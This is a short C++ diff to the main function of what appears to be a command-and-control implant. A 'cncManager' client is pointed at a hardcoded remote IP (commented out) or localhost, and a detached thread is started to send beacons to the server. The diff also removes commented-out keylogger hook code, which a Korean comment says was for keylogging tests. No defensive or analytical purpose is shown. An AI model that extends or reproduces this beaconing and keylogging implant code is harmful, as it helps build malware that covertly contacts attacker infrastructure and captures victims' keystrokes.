@@ -12,16 +12,12 @@ int main() {
     //cncManager client(L"1.251.227.66");
     cncManager client(L"127.0.0.1");
 
-    // 키로깅 테스트용 (나중에 commandManager로 옮길 예정)
-    //keyLogger logger;
-    //std::thread keyLog = std::thread(&keyLogger::startHook, logger);
-    //keyLog.join();
+    std::thread fileHandler = std::thread(&cncManager::sendBeacon, client);
+    fileHandler.detach();
 
-    std::thread handle = std::thread(&cncManager::handleRequest, client);
-    handle.detach();
 
     while (TRUE) {
-        std::cout << "thread test" << std::endl;
+        //std::cout << "thread test" << std::endl;
         Sleep(1000);
     }
 
